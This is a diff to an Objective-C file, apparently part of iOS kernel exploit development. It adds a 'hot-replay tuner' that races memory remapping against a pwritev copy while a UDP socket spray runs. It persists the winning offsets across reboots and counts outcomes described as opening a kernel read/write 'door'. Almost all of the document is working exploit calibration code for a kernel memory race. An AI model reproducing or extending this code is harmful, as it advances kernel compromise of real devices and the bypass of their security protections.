@@ -1,5 +1,6 @@
 // CSRaceCalib.m
-// v8: The ClearSword SOCK_DGRAM Socket Spray Version
+// v10: Hot-Replay Tuner (ID-sweep choreography, unsplit, spray-ON) + cross-boot hot-offset persistence
+// (v8 was the sock_DGRAM spray ID sweep; v9 split-sampler demoted to negative control)
 
 #import "CSRaceCalib.h"
 
@@ -16,6 +17,8 @@
 #include <netinet/icmp6.h>
 #include <sys/uio.h>
 #include <unistd.h>
+#include <stdio.h>
+#include <sys/sysctl.h>
 
 typedef struct __IOSurface *IOSurfaceRef;
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
@@ -162,7 +165,33 @@ static CFNumberRef RCNUM(int64_t v) {
     NSString *lp = [docs stringByAppendingPathComponent:@"racecalib_log.txt"];
     g_rc_log_fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
     rc_log("time %s", [[[NSDate date] description] UTF8String]);
-    rc_log("=== phys_oob calib v8 — SOCK_DGRAM SOCKET SPRAY (A14 23F77) ===");
+    rc_log("=== phys_oob calib v10 — SOCK_DGRAM socket spray ===");
+    {
+        char mch[64] = "?", osv[32] = "?";
+        size_t mlen = sizeof mch, olen = sizeof osv;
+        sysctlbyname("hw.machine", mch, &mlen, NULL, 0);
+        sysctlbyname("kern.osversion", osv, &olen, NULL, 0);
+        rc_log("IDENT device=%s os=%s", mch, osv);
+    }
+    /* v10: warm hot-offset set from previous boots (per-boot law — PARTIAL
+       windows rotate/recur across boots; the tuner accumulates the set). */
+    uint64_t rc_warm[64]; uint32_t warmN = 0;
+    char hotfile[512];
+    {
+        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSString *hp2 = [docs stringByAppendingPathComponent:@"racecalib_hot.txt"];
+        snprintf(hotfile, sizeof hotfile, "%s", [hp2 fileSystemRepresentation]);
+        FILE *hf0 = fopen(hotfile, "r");
+        if (hf0) {
+            char ln0[64];
+            while (fgets(ln0, sizeof ln0, hf0)) {
+                uint64_t v = 0;
+                if (sscanf(ln0, "%llx", &v) == 1 && v && warmN < 64) rc_warm[warmN++] = v;
+            }
+            fclose(hf0);
+        }
+        rc_log("--- v10 warm hot set: %u offsets from racecalib_hot.txt", warmN);
+    }
     rc_log("logfile: %s", [lp UTF8String]);
     rc_log("vm_page_size=0x%lx", vm_page_size);
 
@@ -385,19 +414,80 @@ static CFNumberRef RCNUM(int64_t v) {
     rc_log("spray totals: sockets=%llu", rc_sprayAllocs);
     for (int e = 0; e < 16; e++) if (failErrno[e]) rc_log("  errno %d count=%d", e, failErrno[e]);
 
+    /* v10: persist this boot's hot offsets for future boots (dedup vs warm) */
+    if (rc_hotN) {
+        int hfd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (hfd >= 0) {
+            char l2[40];
+            for (uint32_t i = 0; i < rc_hotN; i++) {
+                int dup = 0;
+                for (uint32_t k = 0; k < warmN; k++) if (rc_warm[k] == rc_hotOffs[i]) { dup = 1; break; }
+                if (!dup) { int n2 = snprintf(l2, sizeof l2, "0x%llx\n", rc_hotOffs[i]); write(hfd, l2, (size_t)n2); }
+            }
+            close(hfd);
+        }
+    }
+
+    /* ---- v10 HOT REPLAY (ID-sweep choreography, unsplit, spray STILL ON) ----
+       Evidence 2026-10-24: boot A gave 6 PARTIAL in the ID sweep → v9 split-swap
+       on 20 hots → 0 events of ANY class. Two differences conspired to close the
+       window: (1) the SPLIT swap replaces the exact swap the window lives on,
+       (2) v9 ran after pthread_join(spray) so the kalloc pressure that created
+       the window was gone. v10 re-races the hot offsets with the EXACT ID-sweep
+       recipe while the spray is still live, 200 tries each. Hot set = this
+       boot's PARTIALs ∪ the persisted warm set. WRONG/FOREIGN = cskrw door;
+       rising PARTIAL count = the window rate itself (the conversion signal). */
+    {
+        uint64_t hot[96]; uint32_t nHot = 0;
+        for (uint32_t i = 0; i < rc_hotN && nHot < 96; i++) {
+            int dup = 0;
+            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_hotOffs[i]) { dup = 1; break; }
+            if (!dup) hot[nHot++] = rc_hotOffs[i];
+        }
+        for (uint32_t i = 0; i < warmN && nHot < 96; i++) {
+            int dup = 0;
+            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_warm[i]) { dup = 1; break; }
+            if (!dup) hot[nHot++] = rc_warm[i];
+        }
+        rc_log("--- v10 HOT REPLAY: %u offsets (boot %u + warm %u), ID-sweep recipe x200, spray on ---",
+               nHot, rc_hotN, warmN);
+        uint64_t hw = 0, hf = 0, hp = 0; int hr2 = 0;
+        for (uint32_t ho = 0; ho < nHot; ho++) {
+            uint64_t off = hot[ho];
+            uint32_t pg = (uint32_t)(off / vm_page_size);
+            for (int it2 = 0; it2 < 200; it2++) {
+                mach_vm_address_t a = pcBig;
+                mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                            pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                memset_pattern8((void *)pcBig, &m0, 0x8000);
+                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                struct iovec iovH = { (void *)(pcBig + 0x3f00), 0x4000 };
+                rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
+                rc_raceOn = 1;
+                pwritev(fdMark, &iovH, 1, 0x3f00);
+                while (rc_raceOn == 1);
+                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                uint64_t got = 0; int32_t delta = 0;
+                rc_cls_t c2 = rc_cls(rbBuf, pg + 1, npages, &got, &delta);
+                if (c2 == C_WRONG) { hw++; if (hr2 < 8) { rc_log("  v10 WRONG hot=0x%llx q0=0x%llx q1=0x%llx", off, rbBuf[0], rbBuf[1]); hr2++; } }
+                else if (c2 == C_FOREIGN) { hf++; if (hr2 < 8) { rc_log("  v10 FOREIGN hot=0x%llx q0=0x%llx q1=0x%llx", off, rbBuf[0], rbBuf[1]); hr2++; } }
+                else if (c2 == C_PARTIAL) hp++;
+            }
+        }
+        rc_log("v10 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (boot %u + warm %u hots, ID-recipe x200)",
+               hw, hf, hp, rc_hotN, warmN);
+    }
+
     rc_go = 0; rc_raceOn = 1;
     rc_sprayGo = 0;
     pthread_join(th, NULL);
     pthread_join(thSpray, NULL);
 
-    /* ---- v9 HOT-OFFSET TUNER (partial→wrong/foreign bias) ----
-       The 9 named PARTIAL offsets are torn-copy windows: the swap completed
-       BETWEEN copy grains. The tuner races them DENSELY with a SPLIT swap:
-       the swap thread maps only the crossing half, the main thread completes
-       the rest after a swept delay — the kernel's pwritev copy now straddles
-       a mid-swap state. WRONG/FOREIGN here = the socket-KRW door condition. */
+    /* ---- v9 SPLIT-SAMPLER (secondary, spray OFF — kept as the NEGATIVE
+       CONTROL after 10-24 evidence: 20 hot offsets → 0 events. It proves the
+       window is schedule-shape-dependent, not a delay-sweep dial.) ---- */
     {
-        rc_log("--- v9 HOT TUNER: %u hot offsets, split-swap delay sweep, dense race ---",
+        rc_log("--- v9 split-sampler: %u hot offsets, split-swap delay sweep ---",
                rc_hotN);
         uint64_t hw=0, hf=0, hp=0, hr=0;
         const uint32_t offList[3] = { 0x3c00, 0x3e00, 0x3f00 };  /* boundary grain widths */
@@ -432,7 +522,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 }
             }
         }
-        rc_log("v9 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (WRONG/FOREIGN = cskrw door OPEN)",
+        rc_log("v9 split-sampler: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (negative control)",
                hw, hf, hp);
     }
 
